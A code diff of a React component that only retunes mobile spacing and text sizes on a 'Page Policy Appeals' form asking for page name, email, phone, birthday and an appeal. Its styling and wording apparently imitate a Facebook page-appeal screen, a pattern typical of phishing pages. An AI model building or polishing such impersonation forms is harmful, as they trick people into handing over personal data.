@@ -315,14 +315,13 @@ const Home = () => {
                         <div className='bg-[#e4e6eb] p-6'>
                             <p className='text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
-                        {/* Sửa phần text mô tả - chỉ trên mobile */}
                         <div className='p-4 text-sm leading-6 font-medium'>
-                            <p className='mb-3 sm:mb-0'>{translatedTexts.detectedActivity}</p>
-                            <p className='mb-3 sm:mb-0'>{translatedTexts.accessLimited}</p>
-                            <p className='sm:mb-0'>{translatedTexts.submitAppeal}</p>
+                            <p>{translatedTexts.detectedActivity}</p>
+                            <p>{translatedTexts.accessLimited}</p>
+                            <p>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
-                            <div className='flex flex-col gap-2'>
+                        <div className='flex flex-col gap-1 p-4 text-sm leading-6 font-semibold sm:gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
@@ -337,7 +336,7 @@ const Home = () => {
                                 />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
@@ -352,7 +351,7 @@ const Home = () => {
                                 />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
@@ -372,7 +371,7 @@ const Home = () => {
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
@@ -388,8 +387,8 @@ const Home = () => {
                             </div>
                             
                             {/* Thêm ô Your Appeal - Textarea lớn */}
-                            <div className='flex flex-col gap-2'>
-                                <p>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
+                                <p className='text-sm sm:text-base'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
@@ -404,7 +403,7 @@ const Home = () => {
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
 
-                            <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
+                            <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal mt-1 sm:mt-0' onClick={handleSubmit}>
                                 {translatedTexts.submit}
                             </button>
                         </div>
